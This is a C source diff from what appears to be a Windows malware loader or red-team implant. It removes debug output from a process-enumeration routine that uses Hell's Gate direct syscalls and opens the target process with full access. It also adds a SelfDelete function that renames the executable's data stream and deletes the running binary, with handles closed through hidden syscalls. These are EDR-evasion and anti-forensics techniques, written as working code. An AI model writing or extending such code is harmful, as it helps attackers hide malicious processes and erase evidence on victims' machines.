@@ -134,7 +134,6 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	// But it will provide information about how much memory to allocate (uReturnLen1)
 	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
 	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);
-	printf("[+] Returned Buffer Length of NtQuerySystemInformation: %d\n", uReturnLen1);
 
 	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
@@ -159,11 +158,10 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
 
 	while (TRUE) {
-		wprintf(L"Enumerated Process Name: %ls\n", SystemProcInfo->ImageName.Buffer);
 		// Small check for the process's name size
 		// Comparing the enumerated process name to what we want to target
-		LPCWSTR lowerCaseTargetProcName = LowerCaseString(szProcName);
-		LPCWSTR lowerCaseProcName = LowerCaseString(SystemProcInfo->ImageName.Buffer);
+		LPCWSTR lowerCaseTargetProcName = LowerCaseStringW(szProcName);
+		LPCWSTR lowerCaseProcName = LowerCaseStringW(SystemProcInfo->ImageName.Buffer);
 		if (SystemProcInfo->ImageName.Length && StringCompareW(lowerCaseTargetProcName, lowerCaseProcName) == 0) {
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
 			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
@@ -185,4 +183,114 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 		return FALSE;
 	else
 		return TRUE;
+}
+
+BOOL SelfDelete() {
+	LPCWSTR filePathBuffer = NULL;
+	DWORD filePathBufferSize = MAX_PATH * (DWORD)sizeof(WCHAR);
+
+	filePathBuffer = (LPCWSTR)HeapAlloc(
+		GetProcessHeap(),
+		HEAP_ZERO_MEMORY,
+		filePathBufferSize
+	);
+
+	// Get the path of the current executable
+	if (GetModuleFileNameW(NULL, filePathBuffer, filePathBufferSize) == 0) {
+		printf("[!] GetModuleFileNameW Failed With Error : 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
+	// Opening a handle to the current file
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	hFile = CreateFileW(
+		filePathBuffer,
+		DELETE | SYNCHRONIZE,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL
+	);
+	if (!hFile) {
+		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
+	// The new data stream name
+	PFILE_RENAME_INFORMATION pFileRenameInfo = NULL;
+	PCWSTR NewStream = (PCWSTR)NEW_STREAM;
+	SIZE_T sFileRenameInfo = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
+
+	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
+	pFileRenameInfo = (PFILE_RENAME_INFORMATION)HeapAlloc(
+		GetProcessHeap(),
+		HEAP_ZERO_MEMORY,
+		sFileRenameInfo
+	);
+	if (!pFileRenameInfo) {
+		printf("[!] HeapAlloc Failed With Error : 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
+	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
+	pFileRenameInfo->FileNameLength = sizeof(NewStream);
+	CopyMemoryEx(pFileRenameInfo->FileName, NewStream, sizeof(NewStream));
+
+	// Renaming the data stream
+	if (!SetFileInformationByHandle(
+		hFile,
+		FileRenameInfo,
+		pFileRenameInfo,
+		sFileRenameInfo
+	)) {
+		printf("[!] SetFileInformationByHandle [R] Failed With Error: 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
+	// Closing the file handle
+	NTSTATUS status = 0;
+	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
+	if ((status = HellDescent(
+		hFile
+	)) != 0x0) {
+		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+		return FALSE;
+	}
+
+	// Re-opening a handle to the current file for refreshing
+	hFile = CreateFileW(
+		filePathBuffer,
+		DELETE | SYNCHRONIZE,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL
+	);
+	if (!hFile) {
+		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
+	FILE_DISPOSITION_INFO fileDispositionInfo = {
+		.DeleteFile = TRUE
+	};
+
+	// Marking for deletion after the file's handle is closed
+	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &fileDispositionInfo, sizeof(fileDispositionInfo))) {
+		printf("[!] SetFileInformationByHandle [D] Failed With Error : 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+
+	// Close the handle for deleting the file
+	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
+	if ((status = HellDescent(
+		hFile
+	)) != 0x0) {
+		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+		return FALSE;
+	}
+
+	return TRUE;
 }
